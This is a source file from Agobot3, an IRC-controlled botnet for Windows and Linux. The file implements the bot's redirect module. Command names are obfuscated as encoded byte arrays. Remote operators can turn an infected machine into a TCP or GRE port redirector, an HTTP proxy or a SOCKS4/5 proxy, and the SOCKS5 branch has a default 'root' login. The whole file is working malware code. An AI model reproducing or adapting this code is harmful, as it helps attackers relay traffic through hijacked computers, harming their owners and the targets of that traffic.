/*	Agobot3 - a modular IRC bot for Win32 / Linux
	Copyright (C) 2003 Ago

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "main.h"
#include "redirect.h"
#include "mainctrl.h"
#include "redir_tcp.h"
#include "redir_gre.h"
#include "redir_http.h"
#include "redir_socks.h"
#include "redir_socks5.h"

void CRedirect::Init(){	m_iNumThreads=0;
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdTCP,		dp(18,5,4,9,18,5,3,20,79,20,3,16,0).CStr(),				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdGRE,		dp(18,5,4,9,18,5,3,20,79,7,18,5,0).CStr(),				this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdHTTP,		dp(18,5,4,9,18,5,3,20,79,8,20,20,16,0).CStr(),			this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSOCKS,	dp(18,5,4,9,18,5,3,20,79,19,15,3,11,19,0).CStr(),		this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSOCKS5,	dp(18,5,4,9,18,5,3,20,79,19,15,3,11,19,73,0).CStr(),	this);
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdStop,		dp(18,5,4,9,18,5,3,20,79,19,20,15,16,0).CStr(),			this); 
}

/*
	.redirect.tcp <localport> <remote> <remoteport>
	.redirect.gre <host> <client> [localip]
	.redirect.http <localport> <ssl>
	.redirect.socks <localport>
*/

bool CRedirect::HandleCommand(CMessage *pMsg){	

	if(!pMsg->sCmd.Compare(m_cmdTCP.sName.CStr())){	
		CRedirectTCP *pTemp=new CRedirectTCP; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_sRemoteAddr.Assign(pMsg->sChatString.Token(2, " "));
		pTemp->m_iRemotePort=atoi(pMsg->sChatString.Token(3, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdGRE.sName.CStr())){	
		CRedirectGRE *pTemp=new CRedirectGRE; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_sServerAddr.Assign(pMsg->sChatString.Token(1, " "));
		pTemp->m_sClientAddr.Assign(pMsg->sChatString.Token(2, " "));
		pTemp->m_sLocalAddr.Assign(pMsg->sChatString.Token(3, " "));
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdHTTP.sName.CStr())){	
		CRedirectHTTP *pTemp=new CRedirectHTTP; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		if(!pMsg->sChatString.Token(2, " ").CompareNoCase("true")) pTemp->m_bUseSSL=true; else pTemp->m_bUseSSL=false;
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	if(!pMsg->sCmd.Compare(m_cmdSOCKS.sName.CStr())){	
		CRedirectSOCKS *pTemp=new CRedirectSOCKS; m_bRedirecting=true; pTemp->m_pRedirect=this;
		pTemp->m_iLocalPort=atoi(pMsg->sChatString.Token(1, " ").CStr());
		pTemp->m_sReplyTo.Assign(pMsg->sReplyTo); pTemp->m_bSilent=pMsg->bSilent; pTemp->m_bNotice=pMsg->bNotice;
		pTemp->Start(); }

	#ifdef _WIN32
	if(!pMsg->sCmd.Compare(m_cmdSOCKS5.sName.Str()))
	{	
		CString s5Login,s5Pass;
		s5Login=pMsg->sChatString.Token(2, " ").CStr();
		s5Pass=pMsg->sChatString.Token(3, " ").CStr();
		if(s5Login.Str()=="")s5Pass="root";
		if(s5Pass.Str()=="")s5Pass="";
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "[Socks5] Starting Redirect [Port %d :: Login: \"%s:%s\"].", \
atoi(pMsg->sChatString.Token(1, " ").CStr()),s5Login.CStr(),s5Pass.CStr());

		StartSocks5(atoi(pMsg->sChatString.Token(1, " ").CStr()),s5Login.CStr(),s5Pass.CStr());
	}
#endif // _WIN32
	if(!pMsg->sCmd.Compare(m_cmdStop.sName.CStr())) m_bRedirecting=false;

	return true; }

void *CRedirectBase::Run(){	
	if(!(g_cMainCtrl.m_cBot.redir_maxthreads.iValue<m_pRedirect->m_iNumThreads))m_pRedirect->m_iNumThreads++; StartRedirect(); m_pRedirect->m_iNumThreads--;
	g_cMainCtrl.m_lCanJoin.push_back(this);
	return NULL; }
